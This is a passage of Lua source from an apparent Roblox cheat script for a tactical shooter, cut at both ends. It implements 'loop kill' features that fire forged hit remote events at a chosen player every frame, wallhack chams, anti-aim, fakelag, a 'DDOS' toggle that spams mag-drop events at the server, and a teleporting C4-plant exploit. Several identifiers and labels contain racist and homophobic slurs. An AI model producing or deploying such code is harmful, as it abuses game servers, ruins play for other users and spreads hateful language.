			if not game.Players:FindFirstChild(tbl.Dropdown) then return loopkillloop:Disconnect() end
			wait(0.1)
			values.rage["Loop kill"]['Alive: '].stringchange('Alive: '..(IsAlive(game.Players:FindFirstChild(tbl.Dropdown)) and 'yes' or 'no'))
			values.rage['Loop kill']['Team: '].stringchange('Team: '..game.Players:FindFirstChild(tbl.Dropdown).Team.Name)
			values.rage['Loop kill']['Account age: '].stringchange('Account age: '..game.Players:FindFirstChild(tbl.Dropdown).AccountAge..' days')
		end)
		
		values.rage["Loop kill"]['Alive: '].stringchange('Alive: ')
		values.rage['Loop kill']['Team: '].stringchange('Team: ')
		values.rage['Loop kill']['Account age: '].stringchange('Account age: ')
	end
 end)

Loopkill:Element("Toggle", "Loop kill for hexagon retards", nil, function(tbl)
if tbl.Toggle then


local step2
	step2 = RunService.RenderStepped:Connect(function()
	if not (tbl.Toggle) then step2:Disconnect() return end
	--values.others.other.Player.Dropdown
				if Players[values.rage["Loop kill"]['Player'].Dropdown].Character and Players[values.rage["Loop kill"]['Player'].Dropdown].Team ~= LocalPlayer.Team and Players[values.rage["Loop kill"]['Player'].Dropdown].Character:FindFirstChild("UpperTorso") then
                if ReplicatedStorage.Events:FindFirstChild('HitNN') then
				ReplicatedStorage.Events.HitNN:FireServer(
                    Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso, -- 1
                    Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso.CFrame --2
                    "Banana", --3
                    100, -- Range --4
                    game.Players.LocalPlayer.Character:WaitForChild("Gun"), --5
                    C.Vec3(), -- Start Position --6
                    C.Vec3(),
                    100, -- Damage Modifier
                    false,
                    false,
                    C.Vec3(),
                    100,
                    C.Vec3()
                )
				else
				
				ReplicatedStorage.Events.HitPart:FireServer(
                    Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso, -- 1
                    Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso.CFrame --2
                    "Banana", --3
                    100, -- Range --4
                    game.Players.LocalPlayer.Character:WaitForChild("Gun"), --5
                    C.Vec3(), -- Start Position --6
                    C.Vec3(),
                    100, -- Damage Modifier
                    false,
                    false,
                    C.Vec3(),
                    100,
                    C.Vec3()
                )				
				end
				end
	end)
	end
end)

Loopkill:Element("Toggle", "Loop kill that uses stormy's kill all", nil, function(tbl)
if tbl.Toggle then
local step1
	step1 = RunService.RenderStepped:Connect(function()
	if not (tbl.Toggle) then step1:Disconnect() return end
	--values.others.other.Player.Dropdown
				if Players[values.rage["Loop kill"]['Player'].Dropdown].Character and Players[values.rage["Loop kill"]['Player'].Dropdown].Team ~= LocalPlayer.Team and Players[values.rage["Loop kill"]['Player'].Dropdown].Character:FindFirstChild("UpperTorso") then
					local oh1 = Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso
					local oh2 = Players[values.rage["Loop kill"]['Player'].Dropdown].Character.UpperTorso.CFrame
					local oh3 = Client.gun.Name
					local oh4 = 4096
					local oh5 = LocalPlayer.Character.Gun
					local oh8 = 15
					local oh9 = false
					local oh10 = false
					local oh11 = C.Vec3(0,0,0)
					local oh12 = 16868
					local oh13 = C.Vec3(0, 0, 0)
					if ReplicatedStorage.Events:FindFirstChild('HitNN') then
					ReplicatedStorage.Events.HitNN:FireServer(oh1, oh2, oh3, oh4, oh5, oh6, oh7, oh8, oh9, oh10, oh11, oh12, oh13)
					else
					ReplicatedStorage.Events.HitPart:FireServer(oh1, oh2, oh3, oh4, oh5, oh6, oh7, oh8, oh9, oh10, oh11, oh12, oh13)
					end
				end
	end)
	end
end)

Loopkill:Element('ToggleTrans', 'Target Chams', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	for _,Player in pairs(Players:GetPlayers()) do
		if Player.Character and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == 'VisibleCham' then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end
Players.PlayerAdded:Connect(function(Player)
	Player:GetPropertyChangedSignal("Team"):Connect(function()
		wait()
		if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == "VisibleCham" then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end)
end)
	LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function(new)
	for _,Player in pairs(Players:GetPlayers()) do
		if Player.Character and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == 'VisibleCham' then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end
	end)
end)

Loopkill:Element('ToggleTrans', 'Target Vchams', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	for _,Player in pairs(Players:GetPlayers()) do
		if Player.Character and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == 'WallCham' then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end
Players.PlayerAdded:Connect(function(Player)
	Player:GetPropertyChangedSignal("Team"):Connect(function()
		wait()
		if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == "WallCham" then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end)
end)
	LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function(new)
	for _,Player in pairs(Players:GetPlayers()) do
		if Player.Character and Player.Name == values.rage["Loop kill"]['Player'].Dropdown then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do
				if Obj.Name == 'WallCham' then
					if tbl.Toggle then
						if values.visuals.players.teammates.Toggle or Player.Team ~= LocalPlayer.Team then
							Obj.Visible = true
						else
							Obj.Visible = false
						end
					else
						Obj.Visible = false
					end
					Obj.Color3 = tbl.Color
					Obj.Transparency = tbl.Transparency
				end
			end
		end
	end
	end)
end)

Loopkill:Element("ToggleColor", "Target box", {default = {Color = C.COL3RGB(255,255,255)}}) 
Loopkill:Element("ToggleColor", "Target name", {default = {Color = C.COL3RGB(255,255,255)}}) 
Loopkill:Element("ToggleColor", "Target health", {default = {Color = C.COL3RGB(0,1,0)}}) 
Loopkill:Element("ToggleColor", "Target weapon", {default = {Color = C.COL3RGB(255,255,255)}}) 
Loopkill:Element("ToggleColor", "Target weapon icon", {default = {Color = C.COL3RGB(255,255,255)}})
local ragebotwhitelist = {}
Loopkill:Element('Button', 'Add in ragebot whitelist', {}, function()
	if #ragebotwhitelist == 0 then
		C.INSERT(ragebotwhitelist,game.Players[values.rage["Loop kill"]['Player'].Dropdown].Character)
	else
		insertwithoutdupes(ragebotwhitelist, game.Players[values.rage["Loop kill"]['Player'].Dropdown].Character)
	end
end)
Loopkill:Element('Button2', 'Remove from ragebot whitelist', {}, function()
	removewithoutdupes(ragebotwhitelist, game.Players[values.rage["Loop kill"]['Player'].Dropdown].Character)
end)
Loopkill:Element('Button2', 'Clear whitelist', {}, function()
		table.clear(ragebotwhitelist)
end)

Loopkill:Element('Label', 'Alive: ')
Loopkill:Element('Label', 'Team: ')
Loopkill:Element('Label', 'Account age: ')


local pitches = {'none', 'up', 'down', 'zero', '180', 'spin', 'random', 'among'}
local antiaim = rage:Sector('angles', 'Right')
antiaim:Element('ToggleKeybind', 'enabled')

antiaim:Element('Dropdown', 'yaw base', {options = {'camera', 'targets', 'spin', 'random', "wasd yaw base"}})
antiaim:Element('Slider', 'yaw offset', {min = -180, max = 180, default = 0})
antiaim:Element('Toggle', 'jitter')
antiaim:Element('Slider', 'jitter offset', {min = -180, max = 180, default = 0})
antiaim:Element('Slider', 'jitter pitch', {min = -100, max = 100, default = 0})
antiaim:Element('Slider', 'jitter wait (ms)', {min = 0, max = 100, default = 0})
--[[antiaim:Element('Toggle', 'Character rotation', {}, function(tbl)
	while tbl.Toggle and IsAlive(LocalPlayer) do wait()
		local x,y,z = LocalPlayer.Character.HumanoidRootPart.Rotation
		if LocalPlayer.Character.HumanoidRootPart.Rotation.Y ~= values.rage.angles.Degress.Slider then
			LocalPlayer.Character.HumanoidRootPart.Rotation.Y = values.rage.angles.Degress.Slider
		end
	end
end)
antiaim:Element('Slider', 'Degress', {min = -180, max = 180, default = 0})--]]
antiaim:Element('Toggle', 'shoot pitch')
antiaim:Element('Slider', 'offset', {min = -180, max = 180, default = 0})
antiaim:Element('Slider', 'pitch', {min = -100, max = 100, default = 0})
antiaim:Element('Slider', 'wait (ms)', {min = 0, max = 100, default = 0})
local shotthingy = false
game:GetService("Workspace").FunFacts["Shots were fired"].Changed:Connect(function()
	if not shotthingy then
		shotthingy = true 

		if values.rage.angles['shoot pitch'].Toggle then
			spawn(function()
				for i=1,10 do wait()
					pcall(function()
						if  game.ReplicatedStorage.Events:FindFirstChild('Control') then
						game.ReplicatedStorage.Events.Control:FireServer(values.rage.angles['pitch'].Slider/7, true)
						end
						game.ReplicatedStorage.Events.ControlTurn:FireServer(values.rage.angles['pitch'].Slider/7, false)
					end)
				end
			end)
		end

		wait(values.rage.angles['wait (ms)'].Slider/100)

		shotthingy = false
	end
end)
antiaim:Element('Dropdown', 'pitch', {options = pitches})
antiaim:Element('Toggle', 'custom pitch')
antiaim:Element('Slider', 'pitch value', {min = -100, max = 100, default = 0})

antiaim:Element('Toggle', 'extend pitch')
antiaim:Element('Dropdown', 'body roll', {options = {'off', '180', 'switch'}})
antiaim:Element('Slider', 'roll offset', {min = -200, max = 200, default = 0})

antiaim:Element('Slider', 'spin speed', {min = 1, max = 200, default = 4})

antiaim:Element('ToggleKeybind', 'overwrite keybind')
antiaim:Element('Dropdown', 'overwrite pitch', {options = pitches})
antiaim:Element('ToggleKeybind', 'lock yaw')

local somedogshitthatbreaksscript = rage:Sector("others", "Right") 
somedogshitthatbreaksscript:Element("Toggle", "remove head") 
somedogshitthatbreaksscript:Element("Toggle", "no animations") 
somedogshitthatbreaksscript:Element("Dropdown", "leg movement", {options = {"off", "slide 1", "slide 2", "no jump anim"}})
			local LagTick = 0
			local fakelag = rage:Sector('fakelag', 'Right')

			fakelag:Element('Toggle', 'DDOS', {Type = "Always", Key = "T"},function(tbl)
				if tbl.Toggle then
					spawn(function()
						while values.rage.fakelag["DDOS"].Toggle   do

								RunService.RenderStepped:Wait()
								RunService.RenderStepped:Wait()
								for i = 1,values.rage.fakelag["DDOS Amount"].Slider,1 do
									local ohInstance1 = LocalPlayer.Character.Gun.Mag              
									ReplicatedStorage.Events.DropMag:FireServer(ohInstance1)
									for i,v in pairs(workspace["Ray_Ignore"]:GetChildren()) do
										if v.Name == "MagDrop" then
											v:Destroy()
										end
									end
								end
       
						end 
					end)
				end
			end)
			fakelag:Element('Slider', 'DDOS Amount', {min = 1, max = 10, default = 1})

			fakelag:Element('Slider', 'set ping', {min = -100, max = 100, default = 0})
			fakelag:Element('ToggleKeybind', 'enabled', {default = {Toggle = false}}, function(tbl)
				if tbl.Toggle then
				else
					FakelagFolder:ClearAllChildren()
					game:GetService('NetworkClient'):SetOutgoingKBPSLimit(9e9)
				end
			end)
			fakelag:Element("Toggle", "fakelag indicator", {}, function(tbl)    
				game:GetService("CoreGui")["fl indicator"].Enabled = tbl.Toggle
			end)
			fakelag:Element('Dropdown', 'amount', {options = {'static', 'freeze', 'tfreeze', 'underfreeze'}})
			fakelag:Element('Slider', 'limit', {min = 1, max = 106, default = 8})
			fakelag:Element('Slider', 'under y', {min = 1, max = 50, default = 8})
			fakelag:Element('Toggle', 'random')
			fakelag:Element('ToggleColor', 'visualize lag', {default = {Toggle = false, Color = C.COL3RGB(255,255,255)}}, function(tbl)
				if tbl.Toggle then
					for _,obj in pairs(FakelagFolder:GetChildren()) do
						obj.Color = tbl.Color
					end
				else
					FakelagFolder:ClearAllChildren()
				end
			end)

			local savedcamerapart = C.INST('Part', RayIgnore)
			savedcamerapart.Anchored = true
			savedcamerapart.CanCollide = false
			savedcamerapart.Size = C.Vec3(1, 1, 1)
			savedcamerapart.Transparency = 1
			coroutine.wrap(function()
				local flindicator = C.INST("ScreenGui")
				local wgrgerqgerq = C.INST("TextLabel")
				local grgrgr = C.INST("UIGradient")
				local gradins = C.INST("Frame")
				local qewgrqgwrgqr = C.INST("TextLabel")
				local niggerhaha = C.INST("Frame")
				local lolfaggot = C.INST("Frame")
				local gergergre = C.INST("UIGradient")

				flindicator.Name = "fl indicator"
				flindicator.Enabled = false
				flindicator.Parent = game.CoreGui
				flindicator.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

				wgrgerqgerq.Name = "wgrgerqgerq"
				wgrgerqgerq.Parent = flindicator
				wgrgerqgerq.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				wgrgerqgerq.BorderColor3 = C.COL3RGB(14, 29, 32)
				wgrgerqgerq.Position = C.UDIM2(0.161994383, 0, 0.437578738, 0)
				wgrgerqgerq.Size = C.UDIM2(0, 62, 0, 22)
				wgrgerqgerq.Font = Enum.Font.Ubuntu
				wgrgerqgerq.Text = ""
				wgrgerqgerq.AutomaticSize = Enum.AutomaticSize.X
				wgrgerqgerq.TextColor3 = C.COL3RGB(255, 255, 255)
				wgrgerqgerq.TextSize = 10.000
				wgrgerqgerq.TextStrokeTransparency = 0.000
				wgrgerqgerq.TextXAlignment = Enum.TextXAlignment.Left

				grgrgr.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(46, 43, 44)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 24, 24))}
				grgrgr.Rotation = 90
				grgrgr.Name = "grgrgr"
				grgrgr.Parent = wgrgerqgerq

				gradins.Name = "gradins"
				gradins.Parent = wgrgerqgerq
				gradins.AutomaticSize = Enum.AutomaticSize.X
				gradins.BackgroundColor3 = C.COL3RGB(222, 232, 255)
				gradins.BorderSizePixel = 0
				gradins.Size = C.UDIM2(0, 62, 0, 2)

				qewgrqgwrgqr.Name = "qewgrqgwrgqr"
				qewgrqgwrgqr.Parent = gradins
				qewgrqgwrgqr.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				qewgrqgwrgqr.BackgroundTransparency = 1.000
				qewgrqgwrgqr.BorderColor3 = C.COL3RGB(27, 42, 53)
				qewgrqgwrgqr.Position = C.UDIM2(0, 0, 1, 0)
				qewgrqgwrgqr.Size = C.UDIM2(0, 62, 0, 19)
				qewgrqgwrgqr.Font = Enum.Font.Ubuntu
				qewgrqgwrgqr.AutomaticSize = Enum.AutomaticSize.X
				qewgrqgwrgqr.Text = "   Fakelag Indicator"
				qewgrqgwrgqr.TextColor3 = C.COL3RGB(255, 255, 255)
				qewgrqgwrgqr.TextSize = 10.000
				qewgrqgwrgqr.TextStrokeTransparency = 0.000
				qewgrqgwrgqr.TextXAlignment = Enum.TextXAlignment.Left

				niggerhaha.Name = "niggerhaha"
				niggerhaha.Parent = gradins
				niggerhaha.BackgroundColor3 = C.COL3RGB(25, 24, 24)
				niggerhaha.BorderColor3 = C.COL3RGB(25, 24, 24)
				niggerhaha.AutomaticSize = Enum.AutomaticSize.X
				niggerhaha.Position = C.UDIM2(0, 0, 9.90899658, 2)
				niggerhaha.Size = C.UDIM2(0, 102, 0, 14)

				lolfaggot.Name = "lolfaggot"
				lolfaggot.Parent = niggerhaha
				lolfaggot.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				lolfaggot.BorderSizePixel = 0
				lolfaggot.Position = C.UDIM2(0, 0, 0, -1)
				lolfaggot.Size = C.UDIM2(0, 0, 0, 14)

				gergergre.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(172, 208, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
				gergergre.Rotation = 90
				gergergre.Name = "gergergre"
				gergergre.Parent = lolfaggot

				local function OWOK_fake_script() -- wgrgerqgerq.LocalScript 
					local script = C.INST('LocalScript', wgrgerqgerq)

					local watermark = script.Parent
					watermark.Draggable = true
					watermark.Active = true
				end
				coroutine.wrap(OWOK_fake_script)()

				while wait(1/16) do
					LagTick = C.CLAMP(LagTick + 1, 0, values.rage.fakelag.limit.Slider)
					if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('UpperTorso') and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and values.rage.fakelag.enabled.Toggle and values.rage.fakelag.enabled.Active then
						if LagTick >= (values.rage.fakelag.random.Toggle and C.RANDOM(0, values.rage.fakelag.limit.Slider) or values.rage.fakelag.limit.Slider)  then
							if values.rage.fakelag.amount.Dropdown == 'static' then 
								game:GetService('NetworkClient'):SetOutgoingKBPSLimit(9e9)
								FakelagFolder:ClearAllChildren()
								LagTick = 0
								if values.rage.fakelag['visualize lag'].Toggle then
									for _,hitbox in pairs(LocalPlayer.Character:GetChildren()) do
										if hitbox:IsA('BasePart') and hitbox.Name ~= 'HumanoidRootPart' then
											local Part = C.INST("Part")
											Part.BottomSurface = Enum.SurfaceType.Smooth
											Part.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
											Part.Color = values.rage.fakelag['visualize lag'].Color
											Part.Material = Enum.Material.ForceField
											Part.Shape = Enum.PartType.Ball
											Part.Size = C.Vec3(2, 2, 2)
											Part.TopSurface = Enum.SurfaceType.Smooth
											Part.Parent = FakelagFolder
											Part.Anchored = true
											Part.CanCollide = false
											Part.Position = LocalPlayer.Character.HumanoidRootPart.Position
										end
									end
								end
							elseif values.rage.fakelag.amount.Dropdown == 'freeze' and allowedtofreeze then 
								LagTick = 0
								FakelagFolder:ClearAllChildren()

								pcall(function()
									workspace.FreezeCharacter2:Remove()
								end)
								wait(0.1)
								lolfaggot:TweenSize(C.UDIM2(0, 102, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.1,true)
								pcall(function()
									local part = C.INST('Part', workspace)

									part.Size = C.Vec3(30, 1, 30) 


									part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									part.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
									part.CanCollide = false
									part.Transparency = 1
									part.Name = 'FreezeCharacter2'


									local weld = C.INST('Weld',part)
									weld.Part0 = part
									weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart


								if values.rage.fakelag['visualize lag'].Toggle then
									for _,hitbox in pairs(LocalPlayer.Character:GetChildren()) do
										if hitbox:IsA('BasePart') and hitbox.Name ~= 'HumanoidRootPart' then
											local Part = C.INST("Part")
											Part.BottomSurface = Enum.SurfaceType.Smooth
											Part.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
											Part.Color = values.rage.fakelag['visualize lag'].Color
											Part.Material = Enum.Material.ForceField
											Part.Shape = Enum.PartType.Ball
											Part.Size = C.Vec3(2, 2, 2)
											Part.TopSurface = Enum.SurfaceType.Smooth
											Part.Parent = FakelagFolder
											Part.Anchored = true
											Part.CanCollide = false
											Part.Position = LocalPlayer.Character.HumanoidRootPart.Position
										end
									end
								end
								end)

								wait(0.1)
								lolfaggot:TweenSize(C.UDIM2(0, 0, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.1,true)
							elseif values.rage.fakelag.amount.Dropdown == 'tfreeze' and allowedtofreeze then 
								LagTick = 0
								FakelagFolder:ClearAllChildren()
								pcall(function()

								end)
								pcall(function()
									workspace.FreezeCharacter2:Remove()
								end)
								local loopstuff
								pcall(function()
									saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									savedcamerapart.CFrame = workspace.Camera.Focus
									workspace.Camera.CameraSubject = savedcamerapart
									loopstuff = game:GetService('RunService').Stepped:Connect(function()
										savedcamerapart.CFrame = C.CF(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.x, savedcamerapart.CFrame.y, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.z)
									end)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + C.Vec3(0, -values.rage.fakelag['under y'].Slider, 0)
								end)

								wait(0.15)
								lolfaggot:TweenSize(C.UDIM2(0, 102, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.15,true)
								pcall(function()
									local part = C.INST('Part', workspace)

									part.Size = C.Vec3(30, 1, 30) 


									part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									part.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
									part.CanCollide = false
									part.Transparency = 1
									part.Name = 'FreezeCharacter2'


									local weld = C.INST('Weld',part)
									weld.Part0 = part
									weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart


								if values.rage.fakelag['visualize lag'].Toggle then
									for _,hitbox in pairs(LocalPlayer.Character:GetChildren()) do
										if hitbox:IsA('BasePart') and hitbox.Name ~= 'HumanoidRootPart' then
											local Part = C.INST("Part")
											Part.BottomSurface = Enum.SurfaceType.Smooth
											Part.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
											Part.Color = values.rage.fakelag['visualize lag'].Color
											Part.Material = Enum.Material.ForceField
											Part.Shape = Enum.PartType.Ball
											Part.Size = C.Vec3(2, 2, 2)
											Part.TopSurface = Enum.SurfaceType.Smooth
											Part.Parent = FakelagFolder
											Part.Anchored = true
											Part.CanCollide = false
											Part.Position = LocalPlayer.Character.HumanoidRootPart.Position
										end
									end
								end
								end)

								wait(0.01)
								lolfaggot:TweenSize(C.UDIM2(0, 0, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.01,true)
								pcall(function()
									loopstuff:Disconnect()
									workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
									workspace.FreezeCharacter2.CFrame = C.CF(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.x, saved.y, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.z)
								end)


								wait(0.1)
								lolfaggot:TweenSize(C.UDIM2(0, 102, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.1,true)
							elseif values.rage.fakelag.amount.Dropdown == 'underfreeze' and allowedtofreeze then 
								LagTick = 0
								FakelagFolder:ClearAllChildren()

								pcall(function()
									workspace.FreezeCharacter2:Remove()
								end)
								local loopstuff
								pcall(function()
									saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									savedcamerapart.CFrame = workspace.Camera.Focus
									workspace.Camera.CameraSubject = savedcamerapart
									loopstuff = game:GetService('RunService').Stepped:Connect(function()
										savedcamerapart.CFrame = C.CF(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.x, savedcamerapart.CFrame.y, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.z)
									end)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + C.Vec3(0, -values.rage.fakelag['under y'].Slider, 0)
								end)

								wait(0.15)
								lolfaggot:TweenSize(C.UDIM2(0, 0, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.15,true)
								pcall(function()
									local part = C.INST('Part', workspace)

									part.Size = C.Vec3(30, 1, 30) 


									part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									part.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
									part.CanCollide = false
									part.Transparency = 1
									part.Name = 'FreezeCharacter2'


									local weld = C.INST('Weld',part)
									weld.Part0 = part
									weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart


								if values.rage.fakelag['visualize lag'].Toggle then
									for _,hitbox in pairs(LocalPlayer.Character:GetChildren()) do
										if hitbox:IsA('BasePart') and hitbox.Name ~= 'HumanoidRootPart' then
											local Part = C.INST("Part")
											Part.BottomSurface = Enum.SurfaceType.Smooth
											Part.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
											Part.Color = values.rage.fakelag['visualize lag'].Color
											Part.Material = Enum.Material.ForceField
											Part.Shape = Enum.PartType.Ball
											Part.Size = C.Vec3(2, 2, 2)
											Part.TopSurface = Enum.SurfaceType.Smooth
											Part.Parent = FakelagFolder
											Part.Anchored = true
											Part.CanCollide = false
											Part.Position = LocalPlayer.Character.HumanoidRootPart.Position
										end
									end
								end
								end)

								wait(0.01)
								lolfaggot:TweenSize(C.UDIM2(0, 102, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.01,true)
								pcall(function()
									loopstuff:Disconnect()
									workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
									workspace.FreezeCharacter2.CFrame = C.CF(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.x, saved.y, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.z)
								end)


								wait(0.1)
								lolfaggot:TweenSize(C.UDIM2(0, 0, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.1,true)
							end
						else
							lolfaggot:TweenSize(C.UDIM2(0, 0, 0, 14),Enum.EasingDirection.In,Enum.EasingStyle.Sine,0.1,true)
							if values.rage.fakelag.enabled.Toggle and values.rage.fakelag.amount.Dropdown == 'static' then
								game:GetService('NetworkClient'):SetOutgoingKBPSLimit(1)
							end
						end
					else

						pcall(function()
							workspace.FreezeCharacter2:Remove()
						end)
						FakelagFolder:ClearAllChildren()
						game:GetService('NetworkClient'):SetOutgoingKBPSLimit(9e9)
					end
				end
			end)()
			fakelag:Element('ToggleKeybind', 'FreezeLOL!', nil, function(tbl)
				if tbl.Toggle and tbl.Active then
					local Freto = C.INST("Part")
					Freto.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
					Freto.CanCollide = false

					Freto.BottomSurface = Enum.SurfaceType.Smooth
					Freto.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					Freto.Name = "Freto"
					Freto.Size = C.Vec3(30, 1, 30)
					Freto.TopSurface = Enum.SurfaceType.Smooth
					Freto.Parent = game:GetService("Workspace")
					Freto.Transparency = 1

					local Part = C.INST("Part")
					Part.CanCollide = false
					Part.Anchored = true
					Part.BottomSurface = Enum.SurfaceType.Smooth
					Part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					Part.Material = Enum.Material.ForceField
					Part.Shape = Enum.PartType.Ball
					Part.Size = C.Vec3(2, 2, 2)
					Part.TopSurface = Enum.SurfaceType.Smooth
					Part.Transparency = 0.3
					Part.Parent = Freto
					Part.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

					local Weld = C.INST("Weld", Freto)
					Weld.Parent = Freto
					Weld.Part0 = Freto
					Weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
				else
					game.Workspace.Freto:Destroy()
				end
			end)
			freezebusy1 = false
			freezebusy2 = false

local function GetSite()
	if (LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.SpawnPoints.C4Plant.Position).magnitude > (LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.SpawnPoints.C4Plant2.Position).magnitude then
		return "A"
	else
		return "B"
	end
end



local exploits = rage:Sector("exploits", "Left") 
--[[exploits:Element('Toggle', 'Remove teammates (less lags for ragebot)', {}, function(tbl)
	for _,Player in pairs(game.Players:GetPlayers()) do
		if tbl.Toggle and Player.Team == LocalPlayer.Team and Player.Character then
			Player.Character.Parent = game.Lighting
		else
			Player.Character.Parent = game.workspace
		end
		Player.CharacterAdded:Connect(function(nigger)
			if tbl.Toggle then
				nigger.Parent = game.Lighting
			else 
				nigger.Parent = game.Workspace 
			end
		end)
		Player:GetPropertyChangedSignal('Team'):Connect(function()
			if Player.Team == LocalPlayer.Team and Player.Character and tbl.Toggle then
				Player.Character.Parent = game.Lighting
			else
				Player.Character.Parent = game.Workspace
			end
		end)
	end
	Players.PlayerAdded:Connect(function(h)
		h.CharacterAdded:Connect(function(w)
			if h.Team == LocalPlayer.Team then
				w.Parent = game.Lighting
			else
				w.Parent = game.Workspace
			end
		end)
	end)
end)--]]
				
exploits:Element("Button", "plant c4", {}, function()
	pcall(function()
	if IsAlive(LocalPlayer) and workspace.Map.Gamemode.Value == "defusal" and workspace.Status.Preparation.Value == false and not planting then 
		planting = true
		local pos = LocalPlayer.Character.HumanoidRootPart.CFrame 
		workspace.CurrentCamera.CameraType = "Fixed"
		LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.SpawnPoints.C4Plant.CFrame
		wait(0.2)
		game.ReplicatedStorage.Events.PlantC4:FireServer((pos + C.Vec3(0, -2.75, 0)) * C.CFAngles(C.RAD(90), 0, C.RAD(180)), GetSite())
